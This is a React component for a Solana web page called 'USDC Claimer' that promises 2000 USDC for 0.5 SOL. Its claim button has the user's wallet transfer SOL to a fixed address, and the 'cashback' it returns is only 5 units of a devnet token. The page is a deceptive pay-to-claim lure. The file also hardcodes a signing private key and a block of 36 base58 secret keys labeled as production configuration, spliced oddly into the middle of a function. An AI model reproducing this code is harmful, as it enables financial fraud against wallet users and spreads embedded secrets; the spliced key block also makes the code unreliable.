/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4aTHn13CZvT9TGNx9p7NDPpXDykdjmhmbkVqr74amDdjsriRb5EoGvnShFmALJhyYJeQTxZpjMoj48CGyAgCABJK"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5RwKLT3B14LBBUDVyCxse4fX1XxgB6awdm2VFVMUWj39ytq3B7LyiiR4p2GUcFLzPZhA5JyeFFMXwnBhqyTp1wrf",
  "key1": "4vajBNGi9mERx8zabSWyv6xAKAcMR2M4UwraQeu6earmD1CJpsVcLoqksg76bv8e8W6cBUuVQ7ZN5ewhvje6Sapc",
  "key2": "6MfPkTm73sPSPBNHNNygQF1rjAqTsYEjhYhd1MrrJ4xiGcJPJnpKFzKUuxAoPxBEESat55xj6QbdrhH8MtyPEP4",
  "key3": "JpGbCFYWcF3dcqasxfXemjKvdjc8GwMq4kSXGbs1GZGuEiinTmqtMTrN97HcioMqU9oZeLPL6mGpjQCugKx2B5p",
  "key4": "4kPijskFgGo6kE29pVEE4yRUWasUZ7BRYQtsVXwkWJbVPZT1JGqMALf5VHRdJbd6BzWc5NmU1L5jC9qEVqvR2Z4y",
  "key5": "uPaBMCoirkvPaSiUAYbeH5edEMJw1gBMQTyTtWfvqP2VN5gCVm8YWyNYqkhsKGVGBasMzW13qraMXquTavcf5D7",
  "key6": "4ZSf24wpDPzsSX7cxyVvcmxfrTLewAw3bnT9Q8S79ZuLibdz2qsCvEFr4X3v355xbWRGTXZYbwFF5mQPTRwvxAHu",
  "key7": "2HHDa2FhmkDerPShonAeBL7yFRCNTjg3ScWxAEojKjgfECVk8VWpjibvxw6srPuGwuTbsd1o3pNiksKds8VWUVTT",
  "key8": "5q1HZTdPrHkMohth9o55L9bpbhKPoo8wwEw3TzbDfcVjbRauUqTuHrDZS3NE2v2br6buigqv9XkupBh9A486tMaN",
  "key9": "tN5Z89bA7yoqdNohsppCRXrCrHsVQpkcWS9v3iS1RNNR9FkU7knuMygS64U6ysicc5ebDmLruSzM3WRpCMDn2iB",
  "key10": "37VqdwCEAG1m9QYzpVptZRfQDGMTwEsuk9cJZvQoMwGeV82zrGGz4WiLsGMiSZvz1ekCAMDkCLt4RrP2kDFergYA",
  "key11": "5kAv1nYWLfS5rbuZjQLvPmbq1JJw1QVkV9CRctGYDdpPKHeu96rLAjhAmaNHMvN5sEUsKwY691Qx8kVaewAs1FXp",
  "key12": "5h99rnbCyR4QiwmiDW6Abj8HXgakk75WzhkMU9PcyoHR8FCV3ECvbibjTNRL749QFDX1e8EGDTtVtvARkbjbedgP",
  "key13": "4F6GnHNJ3cf1SJFDVfG6iFPyF4aNmnywGgvVqxdCkUQUuqtEaR3qASXra2GnJGbPv8Why5mhzvfvTh43NhcUENwN",
  "key14": "4S6STiYK162ws4M7c1A2TQLZquDTixYvRgrWrEvn1kHhXLrREGAyiDw5yoA7GBz7Us9brhPPGdbaSD3xCsPHmpcs",
  "key15": "rE1hgDzZh1YyF2hvife2mZpTzz7HRHzPn5RAT5PNodfc5rDWTJNaifbdAtTERfSrWeN6VQ2hRNGqY85kdfkCRgH",
  "key16": "4CXGLuvs2952jqikQUHcL23oFgGmxbwdbKjAqBvquAGUi5cjRMpKPQepCcMje2DHqHSdspTUPpbLBUKFEJsg8sDc",
  "key17": "3JkQi2WnS5zW8zpVDXdoB8NJ4EWkGciSTTbBXkUoeGxZwWA5anwH5TMSwVejCxnwvCGjY869pzjegfNd21sxZ5Cd",
  "key18": "3TFTX5HEfFSKTEmudkLZbMgG39rXU1Vy8RjuKBYTG7FavY31UDaPswEpLpWtp5ELLZhiFBKTm5FqPWdq1NSY3Lif",
  "key19": "eHZ2SEKxvYHMZZ5xHaDA9wgNVA4dsuLRobwpLTCD3ryVm2tBi4VUZxSuvhLmaRsunpR4iyga5pjteiM3xzBGkgP",
  "key20": "47vLQ1prbXqBpxaJHAMT7arzJaGe7m2gBB2Qqdu8ZxLDfe4Prs5KZM3B8SVxWsEKcoz6sVfiMA6STuhqMszgQxrf",
  "key21": "4tLmxJNzZ9mbj5MXc5Eqv4Kr1EBNkbUna6EE481zedUvcqNnTLAQ5wnHuQNGvmHW3oY65Pm4eLfoioRsWTVR3qNZ",
  "key22": "2t55WNXJRxqioQZo548Z5bCyjrofFH5WbdxebfhiVWHng3jz8iRiB662nfppkYrmjWknH1GHEtc976E1cbG2hCjJ",
  "key23": "3KP3Pz15PCDq7YKFVAofZoygo7pKLFogQQstVQLvLVpftFEjySdCL6HtyEYSaBeKJiP6igwRoZSvdcDwFMfKbNo8",
  "key24": "3uMviYjT1nfvenpWJSNGQAoA53itkytYPv3DdWNrBXtqcJAwvwa9HENQL3mtKpxmDvrxBEy5RA1rQRpeKyBPpyQs",
  "key25": "LWAUwKG2S83JUqd1fUuaDXeTCNXcRNjxrPTjzxqS3kkbkhjGX35KKssHMZ55rR6PXbnBMbS6eb47ceLLSt38uGH",
  "key26": "2ZPSEeEjf6kd4qbic5QsaCFzfzr5Nd5WWSw2DNkxyNuRPHzYnnHaDkNyYYcqBnEJcxz6hMtzEuQHjp6jdJaofc5G",
  "key27": "62J8jHo5yrMkmCjQsESvzwkM88vNkFesLWBNh9nkLQvwTBbrLzVdARE2MGe4vNNhZE3ovRmSRvMPagkJWHDRgiBd",
  "key28": "4xMvzZMjR4QMnpaTG3syiuZ6frtmTHbzfKTNQTektbbV5GB13B7FWbgv3dWbdpXBSkJZnQvKJvjYVHWBjR8wSk9m",
  "key29": "2J3bSPtBeMFZbqMrik2SrwaJh3zgoD3PX2Dbx6kXvcdjMsCt3y8Pb99Gh5aWEhcampvuy12v5TEMCS3qq3Sc1pP5",
  "key30": "YTVzheC1wFKssLM3DaHBYiTL8xmCgyV1v15rVe6u9z11wyp4sRZgPfUC4gvrzscX7P8Jt7yYfDLi366tcMQ11xd",
  "key31": "pJTqRFjZdj7Lb5Ae3EZokZ3QXjzmG8wie36xvUSPZQYCLb8BDmF2N5bZEdxCaotYWRnJbCioAhzu7WtDY6bkoVo",
  "key32": "5qMMp7MydKLiUgQrWSXj8N6WhwZVxcM7zopvRV3yqx6kC1e8oYPcPyj7Z8S3yWcUpt7rL6VbWuNfvJQSRpsqGauu",
  "key33": "47hjK64pskC5jJDUrV3Kvkee9mVTdCCmJv6HFUSbkozMPtrjKKGXyBFQwWyR2LiKgi8MAyx7djn2WVajeoJNZcN8",
  "key34": "3r8q27qZDcYsTkvGJY5v6Uo3naw2pWeXkipp8qpHyasZoeaetmhwwwTyZdmdP3fi2mA9onGRsjGhTYS7amqBVNVB",
  "key35": "5dFi2woGCGhaoBhkpVj9dS6Rt4hn1sA9cAiKHnQdSpEpNqZjedEDT85Tb2aPXuE9jEMwZBjsQ9EcE7dJpfx3y6Ck"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
